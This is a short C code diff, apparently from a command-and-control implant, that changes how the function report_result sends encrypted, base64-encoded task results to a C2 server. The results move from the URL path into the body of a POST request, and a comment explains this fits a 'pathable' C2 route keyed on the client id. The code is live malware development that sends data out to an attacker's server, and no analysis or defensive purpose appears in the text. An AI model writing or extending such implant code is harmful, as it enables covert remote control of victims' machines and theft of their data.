@@ -72,17 +72,11 @@ static void report_result(const bsb_config_t *cfg,
             char report_url[BSB_MAX_URL + BSB_MAX_URI + 8192];
             snprintf(report_url, sizeof(report_url), "%s%s",
                      cfg->c2.url, cfg->c2.report_uri);
-            size_t base_len = strlen(report_url);
-            size_t b64_len = strlen(b64_resp);
-            size_t enc_len = 0;
-            char *b64_encoded = url_encode(b64_resp, b64_len, &enc_len);
-            if (b64_encoded && base_len + enc_len + 1 <= sizeof(report_url)) {
-                memcpy(report_url + base_len, b64_encoded, enc_len);
-                report_url[base_len + enc_len] = '\0';
-                http_response_t resp = https_request(cfg, report_url, "POST", NULL);
-                free(resp.data);
-                free(b64_encoded);
-            }
+            /* Pathable C2 (/command/<client_id>) matches the client id
+             * from the route, so the encrypted payload must travel in
+             * the POST body, never appended to the URL segment. */
+            http_response_t resp = https_request(cfg, report_url, "POST", b64_resp);
+            free(resp.data);
             free(b64_resp);
         }
         free(full_enc);
